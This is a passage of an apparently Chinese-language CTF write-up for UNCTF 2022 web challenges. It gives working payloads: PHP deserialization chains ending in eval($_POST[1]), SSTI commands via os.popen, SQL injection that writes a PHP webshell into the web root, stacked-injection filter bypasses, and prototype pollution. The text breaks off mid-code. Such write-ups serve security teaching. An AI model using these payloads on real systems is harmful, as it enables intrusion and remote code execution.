class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code = <span class="string">&#x27;3.1415926&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;key-&gt;name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Login</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;key=<span class="keyword">new</span> <span class="title class_">Exec</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$b</span>-&gt;test=<span class="keyword">new</span> <span class="title class_">Exec</span>(<span class="string">&#x27;eval($_POST[1]);&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到的结果中把EXEC的属性个数改为2，绕过wakeup:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>Login%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Login%<span class="number">00</span>name%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">223.1415926</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>key%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Exec%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>content%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Test%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>test%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Exec%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>content%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A16%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">eval</span>%<span class="number">28</span>%<span class="number">24</span>_POST%<span class="number">5</span>B1%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>key%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
<p>然后就rce了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668565126567-478a042a-ccc7-4bef-afca-bffb354982e6.png#averageHue=%232e2e2e&clientId=u01e172ef-931e-4&from=paste&height=402&id=u5dc64036&name=image.png&originHeight=502&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76147&status=done&style=none&taskId=u0335f207-2190-43fe-b34f-c02c63fc92c&title=&width=1536" alt="image.png"></p>
<h2 id="听说php有一个xxe"><a href="#听说php有一个xxe" class="headerlink" title="听说php有一个xxe"></a>听说php有一个xxe</h2><p>也就是考一个XXE注入，有关知识可以看我发的文章<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668565207475-4695c655-55d2-4fc4-9c4b-f9c029ec1428.png#averageHue=%23f0f3cb&clientId=u01e172ef-931e-4&from=paste&height=302&id=uaf92a998&name=image.png&originHeight=377&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48890&status=done&style=none&taskId=ua7116ae1-cd8f-4285-a0f6-b605f5a4916&title=&width=1536" alt="image.png"><br>goto：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668565224931-8771f48b-bc5f-4a4a-b829-e1fbc8f07c9d.png#averageHue=%23f2f0ed&clientId=u01e172ef-931e-4&from=paste&height=205&id=u2e717cde&name=image.png&originHeight=256&originWidth=1914&originalType=binary&ratio=1&rotation=0&showTitle=false&size=57731&status=done&style=none&taskId=ua6f094c9-a53a-4dfc-b8b3-48552630b1d&title=&width=1531.2" alt="image.png"><br>你觉得像不像有问题呢，像不像呢，反正我觉得像<br>抓个包：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668565336635-86c9dc87-ed09-4a71-bd66-3cfa98c266c3.png#averageHue=%23f6f6f6&clientId=u5e88ed2a-7add-4&from=paste&height=467&id=ua40d1b17&name=image.png&originHeight=584&originWidth=1300&originalType=binary&ratio=1&rotation=0&showTitle=false&size=104410&status=done&style=none&taskId=u4516b5b9-182a-4f5b-b14b-22f7b09a7b0&title=&width=1040" alt="image.png"><br>结束了</p>
<h2 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy ssti"></a>easy ssti</h2><p>是真的很ez<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668565388268-89ea3608-b8f7-4028-9b37-d1b0e9ef32ee.png#averageHue=%23697077&clientId=u5e88ed2a-7add-4&from=paste&height=452&id=u37cdd8cc&name=image.png&originHeight=565&originWidth=899&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58542&status=done&style=none&taskId=uee4696e6-39a1-470a-a82f-2e9c5f116f2&title=&width=719.2" alt="image.png"><br>测试发现username存在ssti：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668565399603-e6343a8d-03a7-421e-a7b5-c59ebd81335e.png#averageHue=%235d656b&clientId=u5e88ed2a-7add-4&from=paste&height=224&id=ubca7f4d6&name=image.png&originHeight=280&originWidth=817&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26479&status=done&style=none&taskId=u0bc1856e-a31d-41bb-95e1-deb0d24b23e&title=&width=653.6" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668565402541-e0b4c9e6-1ae2-41f1-a82c-e3b5e716559f.png#averageHue=%23e3e0dd&clientId=u5e88ed2a-7add-4&from=paste&height=194&id=ube62cbd4&name=image.png&originHeight=243&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=111685&status=done&style=none&taskId=ud1b87f41-6345-44de-91a6-52880b8129c&title=&width=1536" alt="image.png"><br><code>&#123;&#123;lipsum.__globals__.os.popen('ls').read()&#125;&#125;</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668565429562-b4cbbb87-0d13-494e-bc9b-8d6fa2d55ca1.png#averageHue=%23f0eeed&clientId=u5e88ed2a-7add-4&from=paste&height=207&id=ub69f1556&name=image.png&originHeight=259&originWidth=1648&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74600&status=done&style=none&taskId=u0425308b-c397-42ed-ba67-5e901eac2fc&title=&width=1318.4" alt="image.png"><br>你会发现你这样找文件找不着，那flag在哪呢，在env：</p>
<p><code>&#123;&#123;lipsum.__globals__.os.popen('env').read()&#125;&#125;</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668565457357-a21bdab9-1238-429e-9c7f-a2cdf05502f9.png#averageHue=%23e3e0dd&clientId=u5e88ed2a-7add-4&from=paste&height=226&id=udf14930b&name=image.png&originHeight=282&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=142274&status=done&style=none&taskId=ua64023dd-15ad-4254-91b9-0df92322e07&title=&width=1536" alt="image.png"></p>
<h2 id="poppop"><a href="#poppop" class="headerlink" title="poppop"></a>poppop</h2><p>入口在此：index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;key2-&gt;<span class="title function_ invoke__">abab</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;poc&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;poc&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个感觉就更简单了<br>pop链为：<code>B::_destruct-&gt;C::_tostring-&gt;A::_call</code>，构造一波：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&#x27;eval($_POST[1]);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;key=<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key2=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>结果中一定要绕过wakeup改属性个数<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668565923652-cf067d2f-70cb-4730-96ad-e5ec0e02e768.png#averageHue=%236a6a69&clientId=u213cb0be-0d0b-4&from=paste&height=617&id=u312aa939&name=image.png&originHeight=771&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=96154&status=done&style=none&taskId=u6ece49ab-db98-41bc-bb26-372f3efe108&title=&width=1536" alt="image.png"></p>
<h2 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h2><p>确实是随便注注拉~<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668566018519-0cdc58d7-bb69-4bef-95cb-e330711b1d31.png#averageHue=%23fbfafa&clientId=u213cb0be-0d0b-4&from=paste&height=507&id=u8c4ac100&name=image.png&originHeight=634&originWidth=1296&originalType=binary&ratio=1&rotation=0&showTitle=false&size=66292&status=done&style=none&taskId=ue66abde1-eff5-4f98-8bf2-9272ba3eb9d&title=&width=1036.8" alt="image.png"><br>有回显为，FUZZ一下发现<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668566079703-7f1924f1-e32d-4295-9313-63c0d95f5b21.png#averageHue=%23fbfafa&clientId=u213cb0be-0d0b-4&from=paste&height=454&id=u0f48eeb8&name=image.png&originHeight=567&originWidth=1261&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56680&status=done&style=none&taskId=uede7e217-bb70-4d36-a4be-40c70a1a3f1&title=&width=1008.8" alt="image.png"><br>是存在一个union注入漏洞的，然后发现是双写绕过<code>where,select,from,or</code>:<br><code>?id=0&#39;%20union%20seselectlect%20group_concat(table_name),database()%20ffromrom%20infoorrmation_schema.tables%20whwhereere%20table_schema=database()%2</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668566212771-75cf99fd-f378-466b-a2cb-83eae966f342.png#averageHue=%23fafafa&clientId=u213cb0be-0d0b-4&from=paste&height=484&id=u19b59b57&name=image.png&originHeight=605&originWidth=1285&originalType=binary&ratio=1&rotation=0&showTitle=false&size=78006&status=done&style=none&taskId=ue4b7df33-dc58-4106-9fc6-a4022271ee5&title=&width=1028" alt="image.png"><br>然后这边就爆库什么的呗~但是你会发现什么都没有，要写shell：<br><code>?id=0&#39;%20union%20seselectlect%201,&#39;&lt;?php%20eval($_POST[1]);?&gt;&#39;%20into%20outfile%20&#39;/var/www/html/1.php&#39;%23</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668566310236-216bac1c-4c99-431e-a586-c7e6e46df49a.png#averageHue=%23e9d2b4&clientId=u213cb0be-0d0b-4&from=paste&height=161&id=u1ee52da3&name=image.png&originHeight=201&originWidth=1102&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9381&status=done&style=none&taskId=u96baa07f-c69e-4620-8ef1-d336590a248&title=&width=881.6" alt="image.png"><br>蚁剑上号：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668566332793-d26ca5ec-e3f6-4b3b-9411-48c2642a68b9.png#averageHue=%23eeeeed&clientId=u213cb0be-0d0b-4&from=paste&height=186&id=u34647317&name=image.png&originHeight=233&originWidth=1323&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22349&status=done&style=none&taskId=u36eef7e9-ba7c-484b-9817-83ad9c388d7&title=&width=1058.4" alt="image.png"></p>
<h2 id="ez2048"><a href="#ez2048" class="headerlink" title="ez2048"></a>ez2048</h2><p>这一题好奇怪<br><strong>非预期：</strong><br>扫文件，直接phpinfo搜索环境变量</p>
<p><strong>预期：</strong><br>我也想了一下，但是走到了wasm文件就走不下去了，真的觉得是逆向题：<br>关于邀请码分析如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#走下边0,2,4,6,8,10,12,14,16,18,20,22</span></span><br><span class="line"><span class="comment">#走上边1,3,5,7,9,11,13,15,17,19,21,23</span></span><br><span class="line"><span class="comment">#0^1 1+1 2^3 3^1 4^5 5^3 |6^7 7^5| 8^9 9^7 |10^11 11^9 |12^13 13^11 |14^15 15^13 |16^17 17^15 |18^19 19^17 |20^21</span></span><br><span class="line"><span class="comment">#21^19 |22^23 23^21</span></span><br><span class="line"><span class="comment"># code=&#x27;3&#x27;</span></span><br><span class="line"><span class="comment"># code2=&#x27;b&#x27;</span></span><br><span class="line"><span class="comment"># dict=&quot;0123456789abcdefhijklmnopqrstuvwxyz&#123;&#125;-_ABCDEFGHIJKLMNOPQRSTUVWXYZ#@!&quot;</span></span><br><span class="line"><span class="comment"># for i in dict:</span></span><br><span class="line"><span class="comment">#     if ord(i)^ord(&#x27;!&#x27;)==0:</span></span><br><span class="line"><span class="comment">#         print(i)</span></span><br><span class="line"><span class="comment">#w</span></span><br><span class="line"><span class="comment">#3</span></span><br><span class="line"><span class="comment">#l</span></span><br><span class="line"><span class="comment">#c</span></span><br><span class="line"><span class="comment">#0</span></span><br><span class="line"><span class="comment">#m</span></span><br><span class="line"><span class="comment">#e</span></span><br><span class="line"><span class="comment">#_</span></span><br><span class="line"><span class="comment">#7</span></span><br><span class="line"><span class="comment">#o</span></span><br><span class="line"><span class="comment">#_</span></span><br><span class="line"><span class="comment">#u</span></span><br><span class="line"><span class="comment">#n</span></span><br><span class="line"><span class="comment">#c</span></span><br><span class="line"><span class="comment">#t</span></span><br><span class="line"><span class="comment">#f</span></span><br><span class="line"><span class="comment">#2</span></span><br><span class="line"><span class="comment">#0</span></span><br><span class="line"><span class="comment">#2</span></span><br><span class="line"><span class="comment">#2</span></span><br><span class="line"><span class="comment">#!</span></span><br><span class="line"><span class="comment">#!</span></span><br><span class="line"><span class="comment">#!</span></span><br><span class="line"><span class="comment">#!</span></span><br><span class="line"><span class="comment">#w3lc0me_7o_unctf2022!!!!</span></span><br></pre></td></tr></table></figure>
<p>其实是可以直接写个脚本的，但是我求稳，我怕了<br>然后进去就多了个wasm文件，在这卡住了，里面有可疑的data，但是是乱码，真不晓得咋整<br><strong>预期：</strong><br>溯源game.js可以发现2个和invitecode有关的函数：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668605293518-cb910b0d-4cac-43cb-ac51-1b2c59c09035.png#averageHue=%23cbe6ca&clientId=u76bbb674-0e36-4&from=paste&height=68&id=u90a934a6&name=image.png&originHeight=85&originWidth=494&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8326&status=done&style=none&taskId=u04c8d3f7-7a7c-473d-8d25-ca0a6d26aa8&title=&width=395.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668605301041-c19978c9-0e43-4c92-aa21-4d541480671b.png#averageHue=%23fdfcf5&clientId=u76bbb674-0e36-4&from=paste&height=41&id=uc43cdac3&name=image.png&originHeight=51&originWidth=561&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4614&status=done&style=none&taskId=ucb7827e8-9f64-4fd2-8bff-4700d1fa6ee&title=&width=448.8" alt="image.png"><br>经过测试直接：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668605310582-5a4d60e5-bc9b-40e2-a702-f892edb6439c.png#averageHue=%23fefcfc&clientId=u76bbb674-0e36-4&from=paste&height=166&id=ua196aae5&name=image.png&originHeight=207&originWidth=596&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14996&status=done&style=none&taskId=ue5e88535-33d4-4d4e-908f-29c64a1c772&title=&width=476.8" alt="image.png"><br>先运行上面的，再运行下面的，即可出现flag，好题！！！</p>
<h2 id="babynode"><a href="#babynode" class="headerlink" title="babynode"></a>babynode</h2><p>简单的原型链污染：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_ invoke__">post</span>(<span class="string">&#x27;/&#x27;</span>, function(req, res) &#123;<span class="keyword">var</span> flag=<span class="string">&#x27;flag&#x27;</span>;<span class="keyword">var</span> admin = &#123;&#125;;let user = &#123;&#125;;<span class="keyword">try</span>&#123;<span class="title function_ invoke__">copy</span>(user,req.body);&#125; <span class="keyword">catch</span> (error)&#123;res.<span class="title function_ invoke__">send</span>(<span class="string">&quot;copy error&quot;</span>);<span class="keyword">return</span>;&#125;<span class="keyword">if</span>(admin.id===<span class="string">&#x27;unctf&#x27;</span>)&#123;res.<span class="title function_ invoke__">end</span>(flag);&#125;<span class="keyword">else</span>&#123;<span class="keyword">return</span> res.<span class="title function_ invoke__">end</span>(<span class="string">&quot;error&quot;</span>);&#125;&#125;)</span><br></pre></td></tr></table></figure>
<p>这边重点就是放在copy函数，这里存在一个污染<br><code>copy(user,req.body)</code>：这个应该很容易才出来是赋值的，将user[key]&#x3D;req.body[key]<br>假如key是__proto__那么admin就会被污染：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668567059282-1a0362e2-e98f-4a7f-9bee-3fda7e6087dd.png#averageHue=%23f6f5f5&clientId=u213cb0be-0d0b-4&from=paste&height=265&id=u9e51d28c&name=image.png&originHeight=331&originWidth=1052&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49684&status=done&style=none&taskId=uf97a9967-e53f-4178-91a8-95c50596fb0&title=&width=841.6" alt="image.png"></p>
<h2 id="世界和平"><a href="#世界和平" class="headerlink" title="世界和平"></a>世界和平</h2><p>完全没难度啊<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668567083497-251483f2-2a6b-4fd2-8abc-196f9779c7dd.png#averageHue=%23e7c284&clientId=u213cb0be-0d0b-4&from=paste&height=90&id=u4b863617&name=image.png&originHeight=112&originWidth=1019&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13986&status=done&style=none&taskId=u7e6c651a-770b-4355-82ad-b259a62ac54&title=&width=815.2" alt="image.png"><br>考点就是堆叠注入：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668567096857-7c699d92-765c-45a9-a18e-3270eade0a03.png#averageHue=%23f7f6f4&clientId=u213cb0be-0d0b-4&from=paste&height=143&id=u48b8b491&name=image.png&originHeight=179&originWidth=1306&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21542&status=done&style=none&taskId=u5f5e575f-697b-47cf-b34f-a0e01d7c985&title=&width=1044.8" alt="image.png"><br>到这里然后测试发现ban掉了<code>flag,where,prepare,from，select</code>等等：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668567149371-4f693d8c-a5f0-4bf2-b489-4c7f5dfad716.png#averageHue=%23f5f3f1&clientId=u213cb0be-0d0b-4&from=paste&height=112&id=ueb42b669&name=image.png&originHeight=140&originWidth=846&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16012&status=done&style=none&taskId=uee733014-c0da-40b5-9913-2ea085c9ba3&title=&width=676.8" alt="image.png"><br>然后有个很有意思的现象：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668567169786-c44e9e75-591a-4d8a-b9fd-5929cb58239c.png#averageHue=%23f6f4f3&clientId=u92cace27-3367-4&from=paste&height=82&id=ufb8ae091&name=image.png&originHeight=102&originWidth=954&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9123&status=done&style=none&taskId=u23e0f277-aaaa-4ca9-b9ea-f653c2d30d9&title=&width=763.2" alt="image.png"><br>大写之后就不会报错？我们试试看能不能读Flag表中的列：<br><code>0;show columns From Flag;#</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668567209635-d54f113c-ddcd-4de8-ad06-27617a789be1.png#averageHue=%23fbfbfa&clientId=u92cace27-3367-4&from=paste&height=114&id=u3f2291fe&name=image.png&originHeight=142&originWidth=1240&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9208&status=done&style=none&taskId=u02dba795-5992-4b2b-9124-e568a4a1a42&title=&width=992" alt="image.png"><br>啥也没有，到这里就卡住了一下，不过既然没有显示被ban，那就是可以，肯定是做了某种处理，正好经常碰到双写绕过就试了一下：<br><code>0;show columns FroFromm FlFlagag;</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668567262340-2de47e0a-15ec-4f73-9d80-712516abc19e.png#averageHue=%23f9f7f6&clientId=u92cace27-3367-4&from=paste&height=164&id=uf33b5446&name=image.png&originHeight=205&originWidth=1067&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23634&status=done&style=none&taskId=uc8a13b3c-4a39-4315-8c96-e136023b0ba&title=&width=853.6" alt="image.png"><br>哦吼出来了，说明他把Flag和From替换为了空，那现在就一下下的读：<br><code>0;SESELECTLECT FlFlagag FroFromm FlFlagag</code>:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668567340429-6e6ca3ed-af3d-405a-863d-277dd43ab52b.png#averageHue=%23f8f6f5&clientId=u92cace27-3367-4&from=paste&height=130&id=u4073b4ee&name=image.png&originHeight=163&originWidth=997&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14258&status=done&style=none&taskId=u698e5214-53ed-48df-a686-f3630f34651&title=&width=797.6" alt="image.png"><br>结束了</p>
<h2 id="Sqlsql"><a href="#Sqlsql" class="headerlink" title="Sqlsql"></a>Sqlsql</h2><p>二次注入题，给了源码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span 